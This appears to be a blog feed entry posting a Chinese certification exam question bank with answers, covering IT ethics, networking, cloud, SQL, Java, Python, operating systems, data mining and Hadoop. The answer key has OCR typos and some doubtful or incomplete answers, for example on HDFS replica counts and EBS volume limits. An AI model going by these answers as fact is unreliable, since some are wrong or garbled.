<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>处理师、运维师题库</title>
    <url>/2022/04/10/%E5%A4%84%E7%90%86%E5%B8%88%E3%80%81%E8%BF%90%E7%BB%B4%E5%B8%88%E9%A2%98%E5%BA%93/</url>
    <content><![CDATA[<h2 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h2><p>1[单选题]下列不属于计算机行业职业道德的特点的是()。 C.表现形式的多样性</p>
<p>2<a href>单选题</a>是评价计算机从业人员职业行为好坏的标准，能够促使本人尽最大的能力把工作做好， 树立良好的行业信誉。  A.行业职业道德</p>
<p>3[单选题]下列不属于行业职业道德的作用的是()。  D.不断提高自身的职业技能和单位的网络抗风险能力</p>
<p>4[单选题]下列选项中不属于职业属性的是( )。    D.职业的稳定性</p>
<p>5<a href>单选题</a>是评价大数据从业人员职业行为好坏的标准，能够促使本人尽最大的能力把工作做好， 树立良好的行业信誉。    A.计算机行业职业道德</p>
<p>6[单选题]职业作风是从业者在职业活动中表现出来的相对稳定的工作态度和职业风范。下列有关从业者在职业岗位中的表现不属于职业作风的是()。  D.诚实无欺</p>
<p>7[单选题]每一名大数据从业人员都必须把人民群众的( )作为一切工作的出发点和落脚点，从人权观、发展观、人本观的高度，认识生命与健康的价值，始终坚守个人隐私安全红线。B.隐私安全</p>
<p>8<a href>单选题</a>是指在大数据从业中刻苦钻研，深入探究并掌握网络病毒特征、发展的规律，以及杀毒、隔离的知识和技能。        D.钻研业务</p>
<p>9<a href>单选题</a>是指在遇到紧急情况时，可以先于他人意识到危险的存在，知道解决的方法，心情不慌乱，能够从容应对。        A.临危不乱</p>
<p>\10. 下面哪个不是项目开发成员角色？        D、实施经理</p>
<p>\11. 为满足金融业务的监管和安全要求，平台不需要考虑下列哪个应用?    A、文档版本管理</p>
<p>\12. SVN 全称 Subversion，即?        A、版本控制系统</p>
<p>\13. 以下哪一个是收尾过程的正确顺序？    C、得到正式验收、写出经验教训、解散团队、结束合同</p>
<p>\14. 下面关于交换型以太网说法正确的是？    A、各独立网段是被隔离的</p>
<p>16、VLAN 基本上可以看成是一个？    B、广播域</p>
<p>\17. 下列选项当中，不属于 FTP 服务的使用者是？  D、远程用户</p>
<p>\18. 文件权限读、写、执行三种符号的标志依次是？  A、rwx</p>
<p>\19. 下列选项中不是局域网的以太网标准的是？  D、801.2</p>
<p>\20. 分布式系统由多台计算机组成，它们在地域上是？  A、分散的</p>
<p>\21. Nginx 服务使用什么语言编写？  A、C 语言</p>
<p>\22. 在主从数据库的哪种模式下，部分 slave 的数据同步不连接主节点，而是连接从节点？</p>
<p> A、级联复制</p>
<p>\23. 在使用命令上传一个 glance 镜像到 OpenStack 平台的时候，需要配置镜像格式为 qcow2， 使用的相应参数是？   C、–disk-format</p>
<p>\24. Ceilometer 服务将监控到的数据存储到哪里？  B、MongoDB 数据库</p>
<p>\25. Neutron 服务可以向 OpenStack 平台提供各种不同的网络，下列哪种网络不属于 Neutron 服务能提供的网络？   A、BGP</p>
<p>\26. VPC 的公共子网是一个？  A、 在其关联的路由表中至少有一个使用 Internet 网关（ IGW）的路由。</p>
<p>\27. Amazon S3 存储桶提供以下哪项？  C、 重新编写新对象的一致性，并最终与覆盖和删除一致 </p>
<p>\28. 一个 EC2 实例可以连接多少个 EBS 卷   27</p>
<p>\29. 下列选项当中，哪个是 Dockerfile 中 FROM 指令的含义  D、指定基础镜像</p>
<p>30、下面哪项是 Spring 自动装载模式（）  B，全部选项</p>
<p>31、使用 Oracle 数据库，必须启动哪个服务 B．OracleServiceSID  </p>
<p>\32. 在 Windows 操作系统中，Oracle 的（）服务监听并接受来自客户端应用程序的连接请求。 </p>
<p>A．OracleHOME_NAMETNSListener  </p>
<p>\33. 用二维表结构表达实体集的模型是  D．关系模型</p>
<p>\34. Oracle 11g 是基于（）的A.关系型</p>
<p>\35. ( )代表了数据库中最小粒度的逻辑数据存储层次。  C.数据块</p>
<p>\36. 你使用下列命令连接数据库：sqlplus scott/<a href="mailto:&#116;&#x72;&#x69;&#103;&#103;&#101;&#x72;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#109;">&#116;&#x72;&#x69;&#103;&#103;&#101;&#x72;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#109;</a>:1522/orcl.目标数据库是哪一个？ C. orcl </p>
<p>\37. 设有一个关系：DEPT（DNO，DNAME,LOC），如果要找出倒数第三个字母为 W，并且至少包含 4 个字母的 DNAME，则查询条件子句应写成 WHERE DNAME LIKE  B.‘_ % W _ _’  </p>
<p>\38. 下列解锁 scott 账户的命令正确的是B、alter user scott account unlock; </p>
<p>\39. having , where , group by 的正确执行顺序是D、where ,group by,having </p>
<p>\40. 分析下面两个 SQL 语句，选项中说法正确的有( )  A、两个 SQL 语句的结果完全相同</p>
<p>前面几行代码为：</p>
<p>SELECT last_name, salary , hire_date </p>
<p>FROM EMPLOYEES </p>
<p>ORDER BY salary DESC; </p>
<p>41、 JAVA 所定义的版本中不包括：D、 JAVA2 HE </p>
<p>42、 下列说法正确的是（） A、 JAVA 程序的 main 方法必须写在类里面  </p>
<p>43、 Java 中，在如下所示的 Test 类中，共有（）个构造方法。  C、 2 </p>
<p>前面几行代码为：</p>
<p>public class Test{ </p>
<p>private int x; </p>
<p>public Test(){ </p>
<p>x=35; </p>
<p>}</p>
<p>44、 变量命名规范说法正确的是（） B、 变量不能以数字作为开头；</p>
<p>45、 下列 javaDoc 注释正确的是（） C、 /*<em>我爱北京天安门</em>/ </p>
<p>46、Client 端上传文件的时候下列哪项正确？B. Client 端将文件切分为 Block，依次上传 </p>
<p>47、表达式不可以作为循环条件 A、 i++; </p>
<p>48、 运算符优先级别排序正确的是（）  A、 由高向低分别是：()、!、算术运算符、关系运算符、逻辑运算符、赋值运算符； </p>
<p>49、 以下程序的运行结果是：()  B. 667 </p>
<p>有代码是:</p>
<p>System.out.print(a); </p>
<p>System.out.print(a++); </p>
<p>System.out.print(a); </p>
<p>50、下列输出结果是（） C、 10 </p>
<p>最后两行代码为：</p>
<p>default : a = a + 5;} </p>
<p>}</p>
<p>System.out.print ( a ) ; </p>
<p>51、Python 中 [1,2,3]+[4,5,6] 的结果是多少？ D. [1,2,3,4,5,6] </p>
<p>52、 Python 中可以避免类型错误的函数是？ A． str() </p>
<p>53、 Python 中假设有这样的一个示例：types=[‘娱乐’,’体育’,’科技’] </p>
<p>我们在使用列表时，以下哪个选项，会引起索引错误？D． types[3] </p>
<p>54、 Python 中 range() 函数的作用，描述正确的是？ B． 生成一系列的数字</p>
<p>55、 Python 中列表 books=[‘秦秋月’,’我真的好喜欢’,’可惜终有缘无份’] ，执行切片操作，以下代码输出错误的是？ C． books[1:]，输出：[‘秦秋月’,’我真的好喜欢’] </p>
<p>56、 Python 中 pip 的作用是？ D． Python 包安装器 </p>
<p>57、 Python 中关于 python 类继承，下列描述错误的是？B． 对于继承而来的父类方法， 如果它不符合子类所期望的行为，那么就必须建立新的类。 </p>
<p>58、 Python 中关于 python 导入类，下列描述正确的是？C． 导入类可以把大部分逻辑存储在独立的文件中，然后在主程序中编写高级逻辑。</p>
<p>59．在下面对 OS 功能的概括中，正确的是 B ．进程管理、存储管理、文件管理、作业管理和设备管理</p>
<p>60．将操作系统分成用于实现操作系统最基本功能的内孩和提供各种服务的服务进程两、个 </p>
<p>部分，这样的操作系统结构是 C 。微内核结构</p>
<p>61．可艚怍随机存取数据的存储器是 A ．RAM</p>
<p>62．程序状态字的内容不包含 D ．执行代码的愿户 ID </p>
<p>63．以下关于系统调用、库爱数和应用程序的叙述中，正确的是 A ．应用程序通过系统调用来获得操作系统内核提供的服务</p>
<p>64．程序运行后其计算结果只取决于程序自身，由给定的初始条件决定，不受外界因素的影 </p>
<p>响，这个特点体现了程序执行的 B ．封闭性 </p>
<p>65．进程从运行状态进入阻塞状态的原因可能是  B ．等待某一事件的发生 </p>
<p>66．以下关于进程通信的叙述中，错误的是  D ．P、V 操作一般用于进程问的同步与互斥，也可以实现进程闯大量信息的交换。 </p>
<p>67．正在运行的进程在信号量 s 上作 P 操作之后，当 S=0 时，该进程 </p>
<p>C ．保持运行状态</p>
<p>68．有 m 个进程共享一临界资源，若使用信号量机制实现临界资源的互斥访问，则该信号 </p>
<p>量的最小取值是  D ．1-m </p>
<p>69、使网络服务器中充斥着大量要求回复的信息,消耗带宽,导致网络或系统停止正常服务, </p>
<p>这属于什么攻击类型? (A) A、拒绝服务 </p>
<p>70.为了防御网络监听,最常用的方法是(B) B、信息加密 </p>
<p>71.向有限的空间输入超长的字符串是哪一种攻击手段?(A) A、缓冲区溢出;</p>
<p>72.主要用于加密机制的协议是(D) D、SSL </p>
<p>73.用户收到了一封可疑的电子邮件,要求用户提供银行账户及密码,这是属于何种攻击手 </p>
<p>段?(B) B、钓鱼攻击 </p>
<p>74.Windows NT 和 Windows 2000 系统能设置为在几次无效登录后锁定帐号,这可以防止B、暴力攻击; </p>
<p>75.在以下认证方式中,最常用的认证方式是:A 基于账户名/口令认证 </p>
<p>76.以下哪项不属于防止口令猜测的措施? B、确保口令不在终端上再现; </p>
<p>77.下列不属于系统安全的技术是(B) B、加密狗 </p>
<p>78.抵御电子邮箱入侵措施中,不正确的是(D ) D、自己做服务器 </p>
<p>79、数据质量包含的要素有(D) D.以上所有要素 </p>
<p>80、以下关于数据分析预处理的过程描述正确的是C.数据分析的预处理过程主要包括数据清洗、数据合并、数据标准化和数据转换，他们之间存在交叉，没有严格的先后关系 </p>
<p>82、有一份数据，需要查看数据的类型，并将部分数据做强制类型转换，以及对数值型数据做基本的描述型分析。下列的步骤和方法正确的是A.dtypes 查看类型，astype 转换类别，describe 描述性统计  </p>
<p>83、下列关于 concat 函数、append 方法、merge 函数和 join 方法的说法正确的是(D) </p>
<p>D.join 是常用的主键合并方法之一，但不能够实现左连接和右连接 </p>
<p>84、以下关于 drop_duplicates 函数的说法中错误的是  B.仅支持单一特征的数据去重 </p>
<p>85、以下关于缺失值检测的说法中，正确的是 B.dropna 方法既可以删除观测记录，亦可以删除特征 </p>
<p>86 以下关于异常值检测的说法中错误的是  B.使用箱线图方法时要求数据服从或近似正太分布 </p>
<p>87、下列与标准化方法有关的说法错误的是(A) A.离差标准化简单易懂，对最大值和最小值敏感度不高 </p>
<p>88、关于标准差标准化，下列说法中错误的是(B) B.可能会改变数据的分布情况 </p>
<p>89、以下关于 pandas 数据预处理说法正确的是D.cut 函数默认情况下做的是等宽离散法 </p>
<p>90 某超市研究销售纪录数据后发现，买啤酒的人很大概率也会购买尿布，这种属于数据挖 </p>
<p>掘的哪类问题？(A) A. 关联规则发现 </p>
<p>\91. 以下两种描述分别对应哪两种对分类算法的评价标准？ A. Precision, Recall </p>
<p>\92. 将原始数据进行集成、变换、维度规约、数值规约是在以下哪个步骤的任务？C. 数据预处理 </p>
<p>\93. 当不知道数据所带标签时，可以使用哪种技术促使带同类标签的数据与带其他标签的数 </p>
<p>据相分离？B. 聚类 </p>
<p>\94. 什么是 KDD？ (A) A. 数据挖掘与知识发现 </p>
<p>\95. 使用交互式的和可视化的技术，对数据进行探索属于数据挖掘的哪一类任务？（A） </p>
<p>A. 探索性数据分析 </p>
<p>\96. 下面哪个进程负责 MapReduce 任务调度。 B. Jobtracker </p>
<p>\97. 建立一个模型，通过这个模型根据已知的变量值来预测其他某个变量值属于数据挖掘的 </p>
<p>哪一类任务？(C) C. 预测建模 </p>
<p>\98. 用户有一种感兴趣的模式并且希望在数据集中找到相似的模式，属于数据挖掘哪一类任 </p>
<p>务？(A)  A. 根据内容检索  </p>
<p>99.下面哪种不属于数据预处理的方法？  D 估计遗漏值 </p>
<p>100、在实验集群的 master 节点使用 jps 命令查看进程时，终端出现以下哪项能说明 Hadoop </p>
<p>主节点启动成功？ D. Namenode,JobTracker, secondaryNameNode </p>
<p>101.上题中，等宽划分时（宽度为 50），15 又在哪个箱子里？ (A) A 第一个 </p>
<p>102.下面哪个不属于数据的属性类型：D 相异 </p>
<p>\103. 在上题中，属于定量的属性类型是：C 区间 </p>
<p>\104. 只有非零值才重要的二元属性被称作：C 非对称的二元属性 </p>
<p>\105. 以下哪种方法不属于特征选择的标准方法： D 抽样 </p>
<p>106.下面不属于创建新属性的相关方法的是： B 特征修改 </p>
<p>\107. 考虑值集{1、2、3、4、5、90}，其截断均值（p=20%）是 C 3.5 </p>
<p>\108. 下面哪个属于映射数据到新的空间的方法？ A 傅立叶变换 </p>
<p>\109. 熵是为消除不确定性所需要获得的信息量，投掷均匀正六面体骰子的熵是： B 2.6 比特 </p>
<p>\110. 假设属性 income 的最大最小值分别是 12000 元和 98000 元。利用最大最小规范化的方 </p>
<p>法将属性的值映射到 0 至 1 的范围内。对属性 income 的 73600 元将被转化为：D 0.716 </p>
<p>111.假定用于分析的数据包含属性 age。数据元组中 age 的值如下（按递增序）：13，15， </p>
<p>16，16，19，20，20，21，22，22，25，25，25，30，33，33，35，35，36，40，45，46， </p>
<p>52，70, 问题：使用按箱平均值平滑方法对上述数据进行平滑，箱的深度为 3。第二个箱子 </p>
<p>值为：A 18.3 </p>
<p>\112. 考虑值集{12 24 33 2 4 55 68 26}，其四分位数极差是：(A) A 31 </p>
<p>\113. 一所大学内的各年纪人数分别为：一年级 200 人，二年级 160 人，三年级 130 人，四 </p>
<p>年级 110 人。则年级属性的众数是： (A) A 一年级 </p>
<p>\114. 下列哪个不是专门用于可视化时间空间数据的技术：B 饼图 </p>
<p>\115. 在抽样方法中，当合适的样本容量很难确定时，可以使用的抽样方法是： D 渐进抽样 </p>
<p>\116. 数据仓库是随着时间变化的,下面的描述不正确的是C. 数据仓库随事件变化不断删去旧的数据内容; </p>
<p>\117. 关于基本数据的元数据是指:D. 基本元数据包括关于装载和更新处理,分析处理以及管理方面的信息. </p>
<p>\118. 下面关于数据粒度的描述不正确的是:C. 数据综合度越高,粒度也就越大,级别也就越高; </p>
<p>119、下面关于 Spring MVC 描述正确的是 C，全部选项 </p>
<p>120、下面哪项是 Spring 自动装载模式 B，全部选项  </p>
<h2 id="选择题（多选题库）"><a href="#选择题（多选题库）" class="headerlink" title="选择题（多选题库）"></a>选择题（多选题库）</h2><p>121[多选题]下列选项中属于职业道德基本规范中服务群众的有()。 </p>
<p>A.为人民群众服务 </p>
<p>C.心中时时要有群众，始终把人民的根本利益放在心上 </p>
<p>E.要充分尊重群众，尊重群众的人格和尊严 </p>
<p>122、触发器是响应以下任意语句而自动执行的一条或一组 MYSQL 语句</p>
<p>A．UPDATE </p>
<p>B．INSERT </p>
<p>D．DELETE</p>
<p>123．对于删除操作以下说法正确的是（） abcd</p>
<p>124．下面正确的说法是( ) 除了（A．关键字只能由单个的属性组成）  都选</p>
<p>125． 以下说法正确的是 </p>
<p>A． 字符型既可用单引号也可用双引号将串值括起来 </p>
<p>B．字符型的 87398143 不参与计算的 </p>
<p>D． 数值型的 87398143 将参与计算</p>
<p>126．关于主键下列说法正确的是（） ABCD</p>
<p>127．mySQL 支持哪些逻辑运算符  C．NOT             D．AND </p>
<p>128．以下不属于浮点型的是（） A．smallint     B．mediumint     D．int </p>
<p>129．下列正确的命令是A．show tables;     C．show columns from customers;     D．show databases; </p>
<p>130．正则表达式中，重复元字符“*”表示C．0 个匹配     D．多个匹配 </p>
<p>131．下面对 union 的描述正确的是( ) </p>
<p>A．union 只连接结果集完全一样的查询语句 </p>
<p>C．union 是筛选关键词，对结果集再进行操作 </p>
<p>D．任何查询语句都可以用 union 来连接 </p>
<p>132．下列哪一个逻辑运算符的优先级排列不正确( ) </p>
<p>A．AND/NOT/OR </p>
<p>C．OR/NOT /AND </p>
<p>D．OR/AND/NOT </p>
<p>133． 对某个数据库进行筛选后 , ( )。 </p>
<p>A． 可以选出符合某些条件组合的记录</p>
<p>C．可以选出符合某些条件的记录 </p>
<p>134．下列语句错误的是( ) </p>
<p>B．select * from orders where ordername&lt;&gt;null; </p>
<p>D．select * from orders where ordername not is null; </p>
<p>135．在下列关于关系的叙述中，正确的是( ) </p>
<p>A．C）行在表中的顺序无关紧要 </p>
<p>B． A）表中任意两行的值不能相同 </p>
<p>C． D）列在表中的顺序无关紧要</p>
<p>136．下面系统中属于关系数据库管理系统的是( ) </p>
<p>A． B）MS_SQL SERVER     B．A）Oracle     C． C）IMSD． </p>
<p>137．下列是 MYSQL 比较运算符的是( )     A．!=         B．&lt;&gt;         D．&gt;= </p>
<p>138．Excel 中有关数据库内容 , 描述正确的有( )。 </p>
<p>B．一列为一个字段 , 描述实体对象的属性 </p>
<p>C．Excel 数据库属于“关系数据模型”, 又称为关系型数据库 </p>
<p>D．一行为一个记录 , 描述某个实体对象 </p>
<p>139．下面关于使用 UPDATE 语句，正确的是( ) </p>
<p>B．不能在一个子查询中更新一个表，同时从同一个表中选择 </p>
<p>C．不能把 ORDER BY 或 LIMIT 与多表语法的 UPDATE 语句同时使用 </p>
<p>D．如果把一列设置为其当前含有的值，则该列不会更新 </p>
<p>140． 关于 Excel 数据库应用的描述正确的有( )。 </p>
<p>A．是一个数据清单B．是按一定组织方式存储在一起的相关数据的集合 </p>
<p>141．关于 DELETE 和 TRUNCATE TABLE 的说法，正确的是( ) </p>
<p>B．前者可以删除指定条目的记录，后者不能 </p>
<p>D．前者返回被删除记录数目，后者不返回 </p>
<p>142．关于游标，下列说法正确的是( ) ABCD</p>
<p>143．下列说法正确的是( ) </p>
<p>A．在 MySQL 中，不允许有空表存在，即一张数据表中不允许没有字段。 </p>
<p>B．在 MySQL 中，对于存放在服务器上的数据库，用户可以通过任何客户端进行访问。 </p>
<p>144．下面数据库名称合法的是( ) C．db1_student     D．db1&amp;student </p>
<p>145．下面语句中，表示过虑条件是 vend_id=1002 或 vend_id=1003 的是( ) </p>
<p>A．select * from products where vend_id=1002 or vend_id=1003 </p>
<p>B．select * from products where vend_id in (1002,1003); </p>
<p>146．下列哪些列类型是数值型的数据( )。 A．DOUBLE     B．INT     D．FLOAT </p>
<p>147．以下否定语句搭配正确的是（） A．not in     C．not between and    D．is not null </p>
<p>148．下面检索结果一定不是一行的命令是( ) </p>
<p>A．select distinct * from orders ; </p>
<p>B．select * from orders limit 1,2; </p>
<p>C．select top 1 * from orders; </p>
<p>149．以下哪些是 mySQL 数据类型（） ABCD</p>
<p>150．关于 group by 以下语句正确的是( ) </p>
<p>B． SELECT SUM(sales) FROM Store_Information GROUP BY sales </p>
<p>C．SELECT store_name, price SUM(sales) FROM Store_Information GROUP BY store_name， </p>
<p>price </p>
<p>D．SELECT store_name, SUM(sales) FROM Store_Information GROUP BY store_name</p>
<p>\151. 白盒技术主要包括？     A,B,C,D </p>
<p>\152. 在容器平台中，日志大致分为环境日志和应用日志，下面日志中属于环境日志的有？ </p>
<p>B、容器运行日志     C、宿主机容器引擎日志     D、容器平台管理日志 </p>
<p>\153. 项目从开始到结束的若干阶段构成了项目的生命周期，下面哪些是项目生命周期阶段？(15 </p>
<p>分) A、实施阶段     C、概念阶段     D、计划阶段 </p>
<p>\154. 交换机的主要功能有哪些？(15 分) </p>
<p>A、环路避免     C、转发\过滤 D、地址学习 </p>
<p>\155. VLAN 划分方式有哪些？(15 分) B、基于策略方式     D、基于 MAC 地址方式 </p>
<p>\156. Samba 服务所需软件包括哪些？(15 分) A、Samba     C、Samba-client     D、Samba-common </p>
<p>\157. NFS 由下列那几个部分组成？(15 分)     A、NFS 内核模块     B、NFS 用户空间工具     C、RPC 相关服务 </p>
<p>\158. 下面那些是主从数据的优点？(15 分)     A,B,C,D </p>
<p>\159. 下面选项当中，哪些是私有云平台分类？(15 分) </p>
<p>A、私有云平台     B、私有云服务     D、私有云管理平台</p>
<p>\160. 下列选项当中，不是说明 Swift 组件作用的是？(15 分) </p>
<p>A、用于提供镜像服务 </p>
<p>C、用于提供计量与监控功能 </p>
<p>D、用于提供编排服务或功能 </p>
<p>161．下列说法正确的是（） ABCD</p>
<p>162．视图一般不用于下列哪些语句( ) A．DELETE     C．INSERT     D．UPDATE </p>
<p>163．在算术运算符、比较运算符、逻辑运算符，这三种符号中，它们的优先级排列不正确的是( ) </p>
<p>A．算术/逻辑/比较     B．比较/逻辑/算术     C．比较/算术/逻辑 </p>
<p>164．对同一存储过程连续两次执行命令 DROP PROCEDURE IF EXISTS，将会( ) </p>
<p>B．第一次执行删除存储过程，第二次无提示     D．最终删除存储过程 </p>
<p>165．关于检索结果排序，正确的是( ) </p>
<p>A．关键字 DESC 表示降序，ASC 表示升序 </p>
<p>C．如果指定多列排序，可以在任意列使用升序或降序关键字</p>
<p>166．以下语句错误的是（）; </p>
<p>SELECT rank, AVG(salary) FROM people HAVING AVG(salary) &gt; 1000 GROUP BY rank; </p>
<p>B．SELECT rank, AVG(salary) FROM people HAVING AVG(salary) &gt; 1000 GROUP BY rank; </p>
<p>D．SELECT rank, AVG(salary) FROM people GROUP BY rank WHERE AVG(salary) &gt; 1000; </p>
<p>167．创建数据表时，下列哪些列类型的宽度是可以省略的。 ( ) </p>
<p>A．DATE     B．INT     D．TEXT </p>
<p>168．关于主键下列说法正确的是（） ABCD</p>
<p>169．您需要显示从 2009 年 1 月 1 日到 2009 年 12 月 31 日雇佣的所有职员的姓名和雇佣日期。职员信息表 tblEmployees 包含列 Name 和列 HireDate，下面哪些语句能完成该功能 ( ) </p>
<p>C．SELECT Name, HireDate FROM tblEmployees WHERE HireDate BETWEEN ’2008-12-31’ </p>
<p>AND ‘2010-01-01’ </p>
<p>D．SELECT Name, HireDate FROM tblEmployees WHERE substring(HireDate,1,4)=2009; </p>
<p>170．以下哪项是事务特性( ) ABCD</p>
<p>171．对于显示操作以下说法正确的是（） </p>
<p>B．show table；显示所有表 </p>
<p>D．show databases；显示所有数据库 </p>
<p>172．语句 select * from products where prod_name like ‘%se%’结果集包括( ) </p>
<p>A．检索 products 表中 prod_name 字段以’se’结尾的数据 </p>
<p>B．检索 products 表中 prod_name 字段以’se’开关的数据 </p>
<p>C．检索 products 表中 prod_name 字段包含’se’的数据 </p>
<p>173．在 mysql 提示符下可以输入一个 SQL 语句，并以( )结尾，然后按回车执行该语句( ) </p>
<p>A．“\G”    C．“\g”     D．“;” </p>
<p>174．关于 insert 语句下列说法正确的是（） </p>
<p>B．insert into 表名 values(字段名 1 对应的值，字段名 2 对应值); </p>
<p>D． insert into 表名(字段名 1，字段名 2) values(字段名 1 对应的值，字段名 2 对应值); </p>
<p>175． 关系数据模型哪些优点？( ) </p>
<p>A．A）结构简单   B． C）有标准语言   C． B）适用于集合操作</p>
<p>176．对某个数据库使用记录单 , 可以进行的记录操作有( ) A．删除  B．新建  C．还原 </p>
<p>177．关于 select 语句下列说法正确的是（） </p>
<p>B．select (name) from person where age=12 or name=”aa”; or 或者 </p>
<p>D． select (name，age) from person where age=12 and name=”aa”; and 并且 </p>
<p>178．在字符串比较中，下列哪些是不正确的( ) </p>
<p>A．所有标点符号比数字大 B．所有数字都比汉字大 C．所有英文比数字小 </p>
<p>179．数据库信息的运行安全采取的主措施有( )。ABCD</p>
<p>180、下面哪些不是 java 的简单数据类型? B. Boolean     C. Double</p>
<h2 id="填空-判断题"><a href="#填空-判断题" class="headerlink" title="填空/判断题"></a>填空/判断题</h2><p>181、Hadoop 支持数据的随机读写。 （不支持） （ × ） </p>
<p>182、Hadoop 实现了一个分布式文件系统,简称 HDFS。 （ √ ） </p>
<p>183、在大数据框架中,批处理系统一般不适用于对延时要示较高的场景。 （ √ ） </p>
<p>184、我国的大数据产业政策一直在有序推进,工业和信息化部在 2017 年 1 月正式印发了《大数据产业发展规划》。 （ √ ） </p>
<p>185、hadoop2.7.3 默认块的大小是 64MB （128MB） （ × ）</p>
<p>186、HDFS 系统为了容错保证数据块完整性，每一块数据都采用 2 份副本。 （ √ ） </p>
<p>187、HDFS 以流的形式访问文件系统中的数据。 （ √ ） </p>
<p>188、NameNode 负责管理元数据信息 metadata，client 端每次读写请求，它都会从磁盘（内存） </p>
<p>中读取或会写入 metadata 信息并反馈给 client 端。 （ × ） </p>
<p>189、HDFS 既适合超大数据集存储,也（不）适合小数据集的存储。 （ × ） </p>
<p>190、HDFS 为海量的数据提供了存储,而 MapReduce 为海量的数据提供了计算。 （ √ ） </p>
<p>191、如果 NameNode 意外终止，SecondaryNameNode 会接替它使集群继续工作。（ × ） </p>
<p>192、NameNode 本地磁盘（内存）保存了 Block 的位置信息。 （ × ） </p>
<p>193、因为 HDFS 有多个副本，所以 NameNode 是不存在单点问题的。（存在） （ × ） </p>
<p>194、Hadoop1.0 和 2.0 都具备完善的 HDFS HA 策略。 （1.0 没有） （ × ） </p>
<p>195、HDFS 系统采用 NameNode 定期向 DataNode 发送心跳消息，用于检测系统是否正常运行。 （DataNode 向 NameNode 发送） （ × ） </p>
<p>196、Hadoop 下使用 MapRecue。用户只要继承 MapReduceBase,提供分别实现 Map 和 Reduce 的两个类,并注册 Job 即可自动分布式运行。 （ √ ） </p>
<p>197、Hadoop 是 Java 开发的，所以 MapReduce 只支持 Java 语言编写。 （ × ） </p>
<p>198、MapReduce 的 input split 一定是一个 block。（默认是） （ × ） </p>
<p>199、MapReduce 适于 PB 级别以上的海量数据在线处理。（离线） （ × ） </p>
<p>200、MapReduce 计算过程中，相同的 key 默认会被发送到同一个 reduce task 处理。（ √ ） </p>
<p>201、1. Hadoop 三种运行的模式： 单机版 、 伪分布式 和 分布式 。 </p>
<p>202、HDFS 默认 Block Size 是 64 MB。（填 128 也正确） </p>
<p>\203. MapReduce 任务过程分为两个处理阶段：map 阶段和 reduce 阶段。</p>
<p>204.Map/Reduce 框架由一个单独的 master JobTracker 和每个集群节点一个 slave TaskTracker 共同组成。 </p>
<p>205.MapReduce 确保每个 reducer 的输入都是按键排序的。系统执行排序的过程（即将 map 输出作为输入传给 reducer）称为 shuffle。 </p>
<p>206、Response 类用于动态地响应客户端发送的请求 </p>
<p>207、MySQL 是一种开源的关系型数据库，使用最常用的数据库管理语言(SQL)进行数据库管理 </p>
<p>208、MongoDB 是一个基于分布式文件存储的数据库，属于当前 NoSQL 数据库中比较热门的一种</p>
<p>209、URL 地址由协议头， 服务器地址， 文件路径三部分组成 </p>
<p>210、数据清洗是指去除或修补源数据中的不完整、不一致、含噪音的数据。 </p>
<p>211、数据（Data）、信息（Information）和知识（Knowledge）是广义数据表现的不同形式。 </p>
<p>212、大数据时代的数据挖掘技术需求分析的流派：数据论、方法论、环境论、特征论。 </p>
<p>213、4V 属性 ：数据规模大(Volume) 、数据聚集快(Velocity) 、数据类型多(Variety) 、数据价值大(Value)。 </p>
<p>214、数据挖掘从本质上说是一种新的商业信息处理技术。 </p>
<p>215、数据库中的知识发现（KDD： Knowledge Discovery in Databases）是比数据挖掘出现更早的一个名词 </p>
<p>216、KDD 在人工智能界更流行，而 Data Mining 在数据库界使用更多；在研究领域被称作 KDD，在工程领域则称之为数据挖掘。 </p>
<p>217、数据挖掘的目的是发现知识，知识要通过一定的模式给出。 </p>
<p>218、主要知识模式类型有：广义知识、关联知识、类知识、预测型知识、特异型知识。 </p>
<p>219、有两个基本的方法来挖掘类知识：分类、聚类。</p>
<p>220、科学研究范式：第一范式 (科学实验)、第二范式 (科学理论)、第三范式 (系统模拟)、第四范式 (数据密集型计算) </p>
<p>221、yarn 配置后的 web 监控的默认端口是 8088 </p>
<p>222、HDFS 采用了 主从结构模型 </p>
<p>223、Hase 3 个主要功能组件：库函数，Master 主服务器，Region 服务器 </p>
<p>224、大数据的性质：非结构性、不完备性、时效性、安全性、可靠性 </p>
<p>225、数据分析的目的：对杂乱无章的数据进行集中、萃取、提炼，进而找出所研究对象的内在规律， </p>
<p>发现其价值。 </p>
<p>226、数据库系统的核心是 <em><strong>数据库管理系统</strong></em> 。 </p>
<p>227、事务四大特性分别是 原子性、隔离性、一致性、持久性 。 </p>
<p>228、索引字段值不唯一，应该使用的索引类型为 普通索引 。 </p>
<p>229、人员基本信息一般包括：身份证号，姓名，性别，年龄等。其中可以作为主关键字的是 身份证号 。 </p>
<p>230、SQL 语言中，用于排序的是 __Order by__子句，用于分组的是__group by__子句</p>
<h2 id="简答题："><a href="#简答题：" class="headerlink" title="简答题："></a>简答题：</h2><p>226、简述大数据技术的特点。 Volume（大体量）：即可从数百 TB 到数十数百 PB、甚至 EB 规模。 Variety（多样性）：即大数据包括各种格式和形态的数据。</p>
<p>Velocity（时效性）：即很多大数据需要在一定的时间限度下得到及时处理。 Veracity（准确性）：即处理的结果要保证一定的准确性。 Value（大价值）：即大数据包含很多深度的价值，大数据分析挖掘和利用带来巨大的商业价值。 </p>
<p>227、启动 Hadoop 系统，当使用 bin/start-all.sh 命令启动时，请给出集群各进程启动顺序。 答：启动顺序：namenode –&gt; datanode -&gt; secondarynamenode -&gt; resourcemanager -&gt; nodemanager </p>
<p>228、简述 HBase 的主要技术特点。 （1）列式存储 （2）表数据是稀疏的多维映射表 （3）读写的严格一致性 （4）提供很高的数据读写速度 （5）良好的线性可扩展性 （6）提供海量数据 （7）数据会自动分片 （8）对于数据故障，hbase 是有自动的失效检测和恢复能力 （9）提供了方便的与 HDFS 和 MAPREDUCE 集成的能力。 </p>
